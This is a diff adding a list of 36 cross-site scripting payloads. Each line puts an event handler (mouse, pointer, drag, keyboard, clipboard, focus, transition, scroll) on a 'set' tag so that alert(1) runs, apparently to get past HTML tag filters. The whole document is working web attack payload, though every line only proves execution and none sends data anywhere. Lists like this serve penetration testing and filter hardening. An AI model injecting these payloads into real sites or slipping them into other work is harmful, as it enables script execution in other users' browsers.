@@ -1,0 +1,36 @@
+<set contenteditable onbeforeinput=alert(1)>test
+<set draggable="true" ondrag="alert(1)" style=display:block>test</set>
+<set draggable="true" ondragend="alert(1)" style=display:block>test</set>
+<set draggable="true" ondragenter="alert(1)" style=display:block>test</set>
+<set draggable="true" ondragleave="alert(1)" style=display:block>test</set>
+<set draggable="true" ondragstart="alert(1)" style=display:block>test</set>
+<set id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></set>
+<set onafterscriptexecute=alert(1)><script>1</script>
+<set onbeforescriptexecute=alert(1)><script>1</script>
+<set onblur=alert(1) id=x tabindex=1 style=display:block>test</set><input value=clickme>
+<set onclick="alert(1)" style=display:block>test</set>
+<set oncontextmenu="alert(1)" style=display:block>test</set>
+<set oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<set oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<set ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</set>
+<set onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</set><input value=clickme>
+<set onkeydown="alert(1)" contenteditable style=display:block>test</set>
+<set onkeypress="alert(1)" contenteditable style=display:block>test</set>
+<set onkeyup="alert(1)" contenteditable style=display:block>test</set>
+<set onmousedown="alert(1)" style=display:block>test</set>
+<set onmouseenter="alert(1)" style=display:block>test</set>
+<set onmouseleave="alert(1)" style=display:block>test</set>
+<set onmousemove="alert(1)" style=display:block>test</set>
+<set onmouseout="alert(1)" style=display:block>test</set>
+<set onmouseover="alert(1)" style=display:block>test</set>
+<set onmouseup="alert(1)" style=display:block>test</set>
+<set onmousewheel=alert(1) style=display:block>requires scrolling
+<set onpointerdown=alert(1) style=display:block>XSS</set>
+<set onpointerenter=alert(1) style=display:block>XSS</set>
+<set onpointerleave=alert(1) style=display:block>XSS</set>
+<set onpointermove=alert(1) style=display:block>XSS</set>
+<set onpointerout=alert(1) style=display:block>XSS</set>
+<set onpointerover=alert(1) style=display:block>XSS</set>
+<set onpointerrawupdate=alert(1) style=display:block>XSS</set>
+<set onpointerup=alert(1) style=display:block>XSS</set>
+<set onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></set>
